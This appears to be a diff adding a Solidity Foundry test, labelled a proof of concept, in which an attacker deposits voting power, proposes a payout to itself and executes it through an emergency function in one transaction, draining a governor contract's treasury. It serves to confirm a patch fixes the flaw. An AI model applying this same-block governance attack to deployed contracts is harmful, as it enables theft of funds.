@@ -1,0 +1,29 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Czz} from "../src/Czz.sol";
+
+/// @notice PoC: passes on the ORIGINAL governor, fails on the PATCHED one.
+///         The attacker deposits voting power and executes in the same
+///         transaction, the way a flash loan would, and drains the treasury.
+contract PocTest is Test {
+    Czz internal gov;
+    address internal attacker = makeAddr("attacker");
+
+    function setUp() public {
+        gov = new Czz();
+    }
+
+    function test_sameBlockMajorityDrainsTreasury() public {
+        gov.fzzFund{value: 5 ether}();
+        vm.deal(attacker, 1 ether);
+        vm.startPrank(attacker);
+        gov.fzzDeposit{value: 1 ether}();
+        uint256 id = gov.fzzPropose(attacker, 5 ether);
+        gov.fzzEmergency(id);
+        vm.stopPrank();
+        assertEq(attacker.balance, 5 ether, "same-block majority took the treasury");
+        assertEq(address(gov).balance, 1 ether, "only the vote deposit remains");
+    }
+}
